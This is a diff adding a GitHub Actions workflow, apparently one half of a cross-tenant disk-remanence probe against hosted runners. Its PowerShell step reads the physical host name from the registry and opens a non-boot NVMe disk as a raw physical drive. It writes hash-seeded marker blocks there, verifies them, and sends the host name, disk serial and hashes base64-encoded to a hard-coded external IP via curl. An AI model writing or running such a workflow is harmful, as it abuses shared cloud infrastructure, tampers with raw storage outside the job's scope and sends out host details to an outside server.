@@ -1,0 +1,74 @@
+name: Public-A bounded raw NVMe remanence seeder
+
+on:
+  workflow_dispatch:
+    inputs:
+      cohort:
+        description: Receiver cohort ID
+        required: true
+        type: string
+      runner_label:
+        description: Hosted runner image label
+        required: false
+        default: windows-11-arm
+        type: string
+      samples:
+        description: JSON array of sample indexes
+        required: false
+        default: '[0]'
+        type: string
+
+permissions: {}
+
+jobs:
+  seed:
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        sample: ${{ fromJSON(inputs.samples) }}
+    runs-on: ${{ inputs.runner_label }}
+    timeout-minutes: 8
+    steps:
+      - name: Seed and raw-verify non-system NVMe Direct disk
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $hostName = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters').PhysicalHostNameFullyQualified
+          $disk = Get-Disk | Where-Object { $_.FriendlyName -like '*NVMe Direct*' -and -not $_.IsBoot -and -not $_.IsSystem -and -not $_.IsReadOnly -and $_.Size -gt 268435456 } | Select-Object -First 1
+          if (-not $disk) { Start-Sleep -Seconds 25; exit 0 }
+          $serial = ($disk.SerialNumber -replace '[^0-9A-Fa-f_]', '').Trim('_')
+          $base = 67108864
+          $sha = [System.Security.Cryptography.SHA256]::Create()
+          $hashes = @()
+          $path = "\\.\PHYSICALDRIVE$($disk.Number)"
+          $raw = [System.IO.File]::Open($path, 'Open', 'ReadWrite', [System.IO.FileShare]::ReadWrite)
+          for ($block = 0; $block -lt 32; $block++) {
+            $seed = [Text.Encoding]::ASCII.GetBytes("MYTHREMWARM|$($env:GITHUB_RUN_ID)|${{ matrix.sample }}|$block")
+            $buf = New-Object byte[] 4096
+            $h = $sha.ComputeHash($seed)
+            for ($offset = 0; $offset -lt 4096; $offset += 32) {
+              [Array]::Copy($h, 0, $buf, $offset, 32)
+              $h = $sha.ComputeHash($h)
+            }
+            $raw.Seek($base + $block * 4096, 'Begin') | Out-Null
+            $raw.Write($buf, 0, 4096)
+            $hashes += ([BitConverter]::ToString($sha.ComputeHash($buf)) -replace '-', '').ToLower()
+          }
+          $raw.Flush($true); $raw.Close()
+          $raw = [System.IO.File]::Open($path, 'Open', 'Read', [System.IO.FileShare]::ReadWrite)
+          $verified = 0
+          for ($block = 0; $block -lt 4; $block++) {
+            $raw.Seek($base + $block * 4096, 'Begin') | Out-Null
+            $buf = New-Object byte[] 4096; $raw.Read($buf, 0, 4096) | Out-Null
+            $actual = ([BitConverter]::ToString($sha.ComputeHash($buf)) -replace '-', '').ToLower()
+            if ($actual -eq $hashes[$block]) { $verified++ }
+          }
+          $raw.Close()
+          if ($verified -eq 4) {
+            $manifest = @{cohort='${{ inputs.cohort }}'; source='public-a'; host=$hostName; serial=$serial; base=$base; count=32; hashes=$hashes; raw_verified=$verified; run=$env:GITHUB_RUN_ID; sample='${{ matrix.sample }}'} | ConvertTo-Json -Compress
+            $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($manifest)).Replace('+','-').Replace('/','_')
+            curl.exe -s "http://16.146.243.72:8450/MYTH_REMW_SEED?d=$encoded" | Out-Null
+            curl.exe -s "http://16.146.243.72:8480/seed?d=$encoded" | Out-Null
+          }
+          Start-Sleep -Seconds 25
